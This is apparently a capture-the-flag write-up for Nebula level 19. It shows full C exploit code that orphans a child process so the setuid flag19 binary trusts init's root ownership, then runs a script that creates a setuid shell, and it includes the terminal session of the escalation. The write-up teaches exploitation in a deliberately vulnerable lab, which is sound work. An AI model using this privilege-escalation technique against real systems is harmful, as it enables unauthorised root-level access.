**Intro**

This was probably my favorite level.  I got to have a little fun with the code and it was something more than boilerplate code injection.

After researching the available functions in the code and how it operates I identified *getppid()* as a likely function to exploit.
 
I was able to confirm in [this article](http://www.cs.cityu.edu.hk/~lwang/fork) that *getppid()* is susceptible to reporting its parent process pid if left in a orphan state.  From the article


```
Orphan Processes

If a parent dies before its child, the child is automatically adopted by the
original "init" proces, PID 1.
```

So who owns PID 1?

```
﻿level19@nebula:~$ ps aux | grep init
root         1  0.0  0.0   3200  1796 ?        Ss   11:42   0:00 /sbin/init
```

And just to follow through, root is UID 0

```
﻿level19@nebula:~$ grep root /etc/passwd
root:x:0:0:root:/root:/bin/bash
```

The original init process is owned by root, and therefore just the user we need to take advantage of.

The logic would be as follows

* a parent process is spawned
* child process is forked and waits for the parent process to close
* the child process executes flag19, which wrongly believes the code is being run by root
* the arguments that are passed to flag19 compile a local shell


The code I wrote to do this is heavily influenced by the article referenced earlier on


**orphan.c**

```
#include <stdio.h>
#include <unistd.h>

int main(int argc, char **argv, char **envp)
{
	printf("I am the gatekeeper at PID %d, PPID %d\n",        <<< Let's have some fun
		getpid(),getppid());
	int cPID = fork();                                        <<< Fork the process
	if(cPID >= 0) {
		if(cPID == 0) {
	printf("\nI am the keymaster at PID %d, PPID %d",         
		getpid(), getppid());
		sleep(2);                                             <<< Sleep the child while the parent process dies
		setresuid(geteuid(),geteuid(),geteuid());             <<< Child should have inherited the parent PID of 1 at this point and UID is now effectively 0
		char *args[] = {"/bin/sh", "-c", "/tmp/makeshell.sh", NULL};   <<< Evil Arguments
		printf("\nThe door has been opened!\n");
		execve("/home/flag19/flag19", args, envp);            <<< Doing the needful
		}
	}
	return 0;
}
```

You can get the uncommented C source [here](../resources/orphan.c) and the bash script that's being executed from [here](../resources/makeshell_19.sh).  Just make sure to name everything to suit your needs.
It might also be worth noting that BASH catches on to the trickery and tried to drop suid when executing the makeshell script.  For this reason the shell is being run with */bin/sh* instead which doesn't drop suid and generates the shell binary we need.


```
﻿level19@nebula:~$ cc -o zool orphan.c
level19@nebula:~$ ls -l /home/flag19/
total 8
-rwsr-x--- 1 flag19 level19 7480 2011-11-20 21:22 flag19
level19@nebula:~$ ./zool
I am the gatekeeper at PID 2299, PPID 1460
level19@nebula:~$ 
I am the keymaster at PID 2300, PPID 1
The door has been opened!

level19@nebula:~$ ls -l /home/flag19/
total 16
-rwsr-x--- 1 flag19 level19 7480 2011-11-20 21:22 flag19
-rwsrwxrwx 1 flag19 level19 7317 2016-10-26 13:49 shell
level19@nebula:~$ grep flag19 /etc/passwd
flag19:x:980:980::/home/flag19:/bin/sh

﻿level19@nebula:~$ ~flag19/shell 980
flag19@nebula:~$ getflag
You have successfully executed getflag on a target account
flag19@nebula:~$ 
```


And that, my friends, completes all of the levels.

[Go back to the Main ReadMe](../README.md) or to the next ISO which might still be a work in progress:  [Protostar](../../protostar/README.md)


